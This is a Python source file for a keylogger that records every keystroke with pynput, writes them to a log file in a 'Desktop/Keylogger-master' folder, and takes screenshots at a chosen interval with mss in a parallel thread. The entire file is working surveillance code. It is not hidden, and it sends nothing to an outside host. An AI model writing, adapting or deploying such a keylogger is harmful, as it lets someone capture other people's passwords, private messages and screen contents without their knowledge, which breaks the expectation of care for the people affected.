
import _thread
from mss import mss                     #To take screenshots
from pynput.keyboard import Listener    #To keep record of pressed Keys
from threading import Timer,Thread      #To run thing in parallel(screenshots and keylogs)
import time                             #To record time of Screenshots
import os                               #To make the System to intract with the

count=0
keys=[]                  #List all the pressed keys


                                        
class IntervalTimer(Timer):         #Control the Time interval between each Screenshots
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)
            
            
def write_file(keys):                  #To write the keys to the Files
    with open("Desktop/Keylogger-master/log.txt","a") as f:
        for key in keys:
            k=str(key).replace("'","")
            if k.find("space")>0:      #Replace Key_Space with " " in the main file
                f.write(" ")
            if k.find("enter")>0:      #Replace Key_Enter with "\n or nextline"
                f.write("\n")
            elif k.find("Key") == -1:   
                f.write(k)
                  

class keylogger_main:
    
    def _build_logs(self):   #To create the directory which contains all the data
        if not os.path.exists('Desktop/Keylogger-master'):
            os.mkdir('Desktop/Keylogger-master')
            os.mkdir('Desktop/Keylogger-master/Screenshots')
            os.mknod('Desktop/Keylogger-master/log.txt')
    
    def _on_press(self,k):       #This Function keeps track of pressed keys
        global keys, count
        #print("{0} pressed".format(k))
        keys.append(k)
        count+=1
    
        if count >=10:
            count=0
            write_file(keys)
            keys=[]   
    
    def _keylogger(self):            #Main Funciton to start the key tracker
        with Listener(on_press=self._on_press) as listener:
            listener.join()
            
    def _Screenshot(self):           #Main Function to start thr Screenshot tracker
        sct=mss()
        sct.shot(output='Desktop/Keylogger-master/Screenshots/{}.png'.format(time.time()))
    
    def run(self,interval):          #Main fucntion to start the keylogger
        
        self._build_logs()
        Thread(target=self._keylogger).start()   #This thread function is used to Run the Keys and Screenshots tracker parallely
        IntervalTimer(interval, self._Screenshot).start()
        
        
km=keylogger_main() 
interval=int(input("Enter the time interval (in sec.) between each Screenshot:"))
km.run(interval)


